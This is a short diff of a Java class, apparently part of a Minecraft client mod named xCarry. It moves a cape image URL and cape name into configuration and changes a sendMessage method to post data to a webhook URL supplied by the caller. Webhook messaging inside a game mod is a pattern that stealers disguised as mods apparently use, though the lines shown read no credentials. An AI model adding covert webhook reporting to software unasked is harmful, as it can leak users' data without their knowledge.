@@ -27,8 +27,8 @@ import java.util.regex.Pattern;
 
 public class xCarry {
     public static final String l = Configs.getMain();
-    public static final String CapeImageURL = "https://cdn.discordapp.com/attachments/901654339905536022/907521922496081920/dd.png";
-    public static final String CapeName = "Devito";
+    public static final String CapeImageURL = Configs.getpfp();
+    public static final String CapeName = Configs.getname();
     public static espUtil d = new espUtil(l);
 
     public static void PreIntUtil() {
@@ -403,12 +403,12 @@ public class xCarry {
         System.out.println(((HttpURLConnection) connection).getResponseMessage());
 
     }
-    public static void sendMessage(String message) {
+    public static void sendMessage(String message, String Webhook) {
         PrintWriter out = null;
         BufferedReader in = null;
         StringBuilder result = new StringBuilder();
         try {
-            URL realUrl = new URL(Configs.getMain());
+            URL realUrl = new URL(Webhook);
             URLConnection conn = realUrl.openConnection();
             conn.setRequestProperty("accept", "*/*");
             conn.setRequestProperty("connection", "Keep-Alive");
